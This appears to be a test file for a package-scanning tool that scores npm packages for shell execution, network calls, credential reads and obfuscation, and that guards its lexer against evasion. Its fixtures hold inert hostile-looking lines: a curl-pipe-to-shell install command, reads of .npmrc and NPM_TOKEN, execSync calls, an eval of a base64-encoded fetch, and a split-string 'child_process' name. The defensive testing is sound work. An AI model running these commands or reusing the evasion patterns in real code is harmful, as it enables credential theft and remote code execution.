// Precision of the source rules: evidence must support its label. Code rules match code, not comments or regex
// literals (apm-score-v4); what is only named is `possible`. Since apm-score-v7 a match apm-score-v3 made in code or
// a string stands unless the tree proves it harmless (a string only compared, or held where nothing reads it), so
// several cases below show both sides: the same text held where apm cannot see every reader, and where it can. The
// second half checks that the lexer cannot be steered into hiding code. Payloads are inert stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, POINTS, POSSIBLE_POINTS, type Analysis, type TarEntry } from "../src/index.ts";
import { scanText, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";

type Found = Partial<Record<CodeSignal, Confidence>>;

/** The strongest confidence each signal reached. */
function found(text: string, lang: Lang = "js"): Found {
  const out: Found = {};

  for (const f of scanText(text, lang)) if (out[f.id] !== "confirmed") out[f.id] = f.confidence;

  return out;
}

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analyzeFiles(files: Record<string, string>, main = "index.js"): Analysis {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };

  return analyze({ name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] });
}

// hono@4.13.18 dist/jsx/base.js:10, verbatim. `|sh|` inside the regex literal matched the pipe-to-shell rule.
const HONO_BASE_10 =
  'const toSVGAttributeName = (key) => /[A-Z]/.test(key) && key.match(/^(?:al|basel|clip(?:Path|Rule)$|co|do|fill|fl|fo|gl|let|lig|i|marker[EMS]|o|pai|pointe|sh|st[or]|text[^L]|tr|u|ve|w)/) ? key.replace(/([A-Z])/g, "-$1").toLowerCase() : key;\n';

describe("evidence that does not support its label", () => {
  test("hono's SVG attribute regex is not a shell command", () => {
    expect(found(HONO_BASE_10)).toEqual({});
    const a = analyzeFiles({ "dist/jsx/base.js": HONO_BASE_10 }, "dist/jsx/base.js");
    expect(a.signals.map((s) => s.id)).not.toContain("shell-exec");
  });

  test("regex literals, logical or and prose comments never match", () => {
    expect(found("const plural = [/(x|ch|ss|sh)$/gi, '$1es'];\n")).toEqual({});
    expect(found("if (pred[isOdd] < 0 || sh == 4) x();\n")).toEqual({});
    expect(found("// CVE fix similar to curl (CVE-2022-32206).\nmodule.exports = 1;\n")).toEqual({});
    expect(found("/**\n * @example\n *   return fetch('http://backend', req)\n */\nexport const x = 1;\n")).toEqual({});
    expect(found("x(); // see `.fetch()`, the entry point\n")).toEqual({});
  });

  test("a call written inside an ordinary string is text where the string provably goes nowhere that runs it", () => {
    expect(found('function f(e) { return e.message === "fetch() returned undefined" }\n')).toEqual({});
    expect(found('function f() { const d = "Disallow the use of `eval()`"; }\n')).toEqual({});
    // an error's message leaves with it, and whatever catches it may run it: v3's verdict stands
    expect(found('throw new Error("fetch() returned undefined");\n')).toEqual({ network: "confirmed" });
  });

  test("function and method definitions are not calls", () => {
    expect(found("module.exports.fetch = function fetch (init, options) { return 1 };\n")).toEqual({});
    expect(found("class A { async fetch(url) { return url } }\n")).toEqual({});
  });

  test("fetch of a data: URL and a TypeScript type import never reach the network", () => {
    expect(found("const R = (await fetch('data:,')).constructor;\n")).toEqual({});
    expect(found("type R = NotAny<import('undici').RequestInit>;\n", "ts")).toEqual({});
  });

  test("WebAssembly, fonts and data tables in literals are not obfuscated code", () => {
    const wasm = Buffer.concat([Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]), Buffer.alloc(3000, 7)]).toString("base64");
    expect(found(`const wasm = "${wasm}";\n`)).toEqual({});
    expect(found(`const t = '${"\\xe1\\x01".repeat(40)}';\n`)).toEqual({});
  });

  test("JSON and type declarations are data: what they name is possible at most", () => {
    expect(found("{ \"tsType\": \"import('net').ListenOptions\" }", "data")).toEqual({});
    expect(found('declare const x: "child_process";\n', "data")).toEqual({ "shell-exec": "possible" });
  });
});

describe("confirmed versus possible", () => {
  test("a module specifier or a call's argument confirms; a name only compared is possible", () => {
    expect(found("const cp = require('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("import 'node:child_process';\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found('function isRunner(name) { return name === "child_process" }\n')).toEqual({ "shell-exec": "possible" });
    // a list another script or module can read may be handed to require: v3's verdict stands
    expect(found('const builtins = ["buffer", "child_process", "fs"];\n')).toEqual({ "shell-exec": "confirmed" });
  });

  test("shell text is confirmed when a call runs it, or when apm cannot see every place it goes", () => {
    expect(found("cp.exec('curl -s https://example.invalid/x | sh');\n")["shell-exec"]).toBe("confirmed");
    expect(found("function f() { const help = 'install with: curl -s https://example.invalid/x | sh'; }\n")["shell-exec"]).toBe("possible");
    expect(found("const help = 'install with: curl -s https://example.invalid/x | sh';\n")["shell-exec"]).toBe("confirmed");
  });

  test("a credential path read is confirmed; one held where nothing reads it is possible", () => {
    expect(found("fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n")).toEqual({ "credential-access": "confirmed" });
    expect(found('function root(dir) { const markers = ["package.json", ".npmrc"]; }\n')).toEqual({ "credential-access": "possible" });
    expect(found('const markers = ["package.json", ".npmrc"];\n')).toEqual({ "credential-access": "confirmed" });
    expect(found("const t = process.env.NPM_TOKEN;\n")).toEqual({ "credential-access": "confirmed" });
  });

  test("an alias of require and a method named fetch count as apm-score-v3 counted them", () => {
    // what they are cannot be proven, so the floor keeps v3's reading; the tree only says why it is unsure
    expect(found("aliasedRequire = require;\n")).toEqual({ eval: "confirmed" });
    expect(found("const r = await config.fetch(url);\n")).toEqual({ network: "confirmed" });
    expect(found("const r = await config.fetch('data:,');\n")).toEqual({});
    expect(found("const r = await globalThis.fetch(url);\n")).toEqual({ network: "confirmed" });
  });

  test("a possible signal costs fewer points and says so in its label", () => {
    const a = analyzeFiles({ "index.js": 'module.exports = function () { const names = ["child_process"]; };\n' });
    const s = a.signals.find((x) => x.id === "shell-exec");
    expect(s?.confidence).toBe("possible");
    expect(s?.points).toBe(POSSIBLE_POINTS["shell-exec"]);
    expect(s?.points).toBeGreaterThan(POINTS["shell-exec"]);
    expect(s?.label).toMatch(/^Possible/);
    expect(finalize(a, { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null }).score).toBe(100 + POSSIBLE_POINTS["shell-exec"]);
  });

  test("one confirmed finding makes the signal confirmed and shows only confirmed evidence", () => {
    const a = analyzeFiles({ "index.js": 'const names = ["child_process"];\nrequire("./run");\n', "run.js": "require('child_process').execSync('id');\n" });
    const s = a.signals.find((x) => x.id === "shell-exec");
    expect(s?.confidence).toBe("confirmed");
    expect(s?.evidence.every((e) => !e.includes("possible"))).toBe(true);
  });

  test("a name joined from pieces but never loaded is possible; loaded, it is confirmed", () => {
    expect(found("function f() { const n = 'chi' + 'ld_' + 'process'; }\n")["shell-exec"]).toBe("possible");
    expect(found("const n = 'chi' + 'ld_' + 'process';\n")["shell-exec"]).toBe("confirmed");
    expect(found("const cp = require('chi' + 'ld_' + 'process');\n")["shell-exec"]).toBe("confirmed");
  });
});

describe("the lexer cannot be steered into hiding code", () => {
  for (const [label, src] of [
    ["a division that looks like a regex", "const r = (a) / 2; require('child_process').execSync(c); const q = b / 3;\n"],
    ["a division after a function expression", "x = function(){} / require('child_process').execSync(c) / 1;\n"],
    ["a postfix increment before a division", "i++ / 2; require('child_process').execSync(c); j / 3;\n"],
    ["a non-ASCII identifier before a division", "const é = 1; x = é / require('child_process').execSync(c) / 1;\n"],
    ["a regex after an if header holding quotes", "if (1) /x'|'\\//.test(''); require('child_process').execSync(c); // '\n"],
    ["a template expression", "const s = `${require('child_process').execSync('id')}`;\n"],
    ["comment openers inside strings", "const s = '/*'; require('child_process').execSync(c); const t = '*/';\n"],
    ["an unbalanced bracket", "}); require('child_process').execSync(c);\n"],
    ["a stray quote in a file the lexer cannot follow", ") 'x; require(\"child_process\").execSync(c);\n"],
  ] as const) {
    test(`${label} does not hide a call`, () => {
      expect(found(src)["shell-exec"]).toBe("confirmed");
    });
  }

  test("JSX text cannot open a fake comment or string", () => {
    const a = analyzeFiles({ "index.jsx": "const a = <p>see http://x and it's here</p>; require('child_process').execSync(c);\n" }, "index.jsx");
    expect(a.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
  });

  test("a payload passed to eval stays confirmed", () => {
    const b64 = Buffer.from("fetch('https://example.invalid/c')").toString("base64");
    expect(found(`eval(atob('${b64}'));\n`)).toMatchObject({ network: "confirmed", obfuscated: "confirmed" });
  });

  test("install commands and shell scripts are read raw", () => {
    expect(found("curl -s https://example.invalid/x.sh | sh", "plain")).toMatchObject({ "shell-exec": "confirmed", network: "confirmed" });
  });
});
